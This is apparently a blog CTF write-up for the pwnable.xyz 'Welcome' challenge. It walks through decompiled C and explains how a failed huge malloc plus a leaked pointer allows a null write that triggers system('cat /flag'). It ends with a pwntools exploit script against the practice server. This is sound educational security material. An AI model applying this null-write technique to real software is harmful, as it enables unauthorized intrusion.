---
date: '2026-02-01T06:32:38+08:00'
draft: false
title: 'Pwnable.xyz-Welcome'
tags: ["CTF", "pwn", "pwnable.xyz"]
---
# Welcome
> Are you worthy to continue?

> Score : 50 \
Author: uafio \
Solves: 1784

<!--more-->

## Recon

With the IDA (F5)，the main function will show as below:
``` c =
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  _QWORD *v3; // rbx
  char *buf; // rbp
  size_t n; // rdx
  size_t size[5]; // [rsp+0h] [rbp-28h] BYREF

  size[1] = __readfsqword(0x28u);
  sub_B4E(a1, a2, a3);
  puts("Welcome.");
  v3 = malloc(0x40000u);
  *v3 = 1;
  _printf_chk(1, "Leak: %p\n", v3);
  _printf_chk(1, "Length of your message: ");
  size[0] = 0;
  _isoc99_scanf("%lu", size);
  buf = (char *)malloc(size[0]);
  _printf_chk(1, "Enter your message: ");
  read(0, buf, size[0]);
  n = size[0];
  buf[size[0] - 1] = 0;
  write(1, buf, n);
  if ( !*v3 )
    system("cat /flag");
  return 0;
}
```

1. It allocates a very large chunk of memory using `malloc(0x40000u)` and assigns it to the pointer v3 and sets the first 8 bytes of that memory with 1 (`*v3 = 1`)
2. Stores the length that you input with in `size[0]`
3. It calls `malloc(size[0])` to create a buffer called buf for your message.
4. writes 0 at the end of the buf
5. Cat /flag when v3 is 0


## Solution

To let v3 be 0，we can control `[size[0]` with a massive number，then the malloc will fail and return NULL(0)，which equal to buf

And `buf[size[0] - 1] = 0` will effectively becomes : `0 + (size[0] - 1) = 0`

So the strategy will be like:
1. Get the leak : program print `Leak: 0x...` which equals to `v3`
2. We want write 0 at address of v3，since `size[0] - 1` = leak，the length should be leak + 1
3. with the function `0 + (leak + 1) - 1 = leak`,v3 be changed as 0
4. program execute `system("cat /flag")`

## Exploit
```python
from pwn import *

p = process("./challenge")
p = remote("svc.pwnable.xyz",30000)

p.readuntil(": ")
leak = p.readline()
p.readuntil("message: ")
lens = int(leak,16) + 1

p.writeline(str(lens))
p.readuntil("message: ")
p.writeline("A")
p.interactive()
```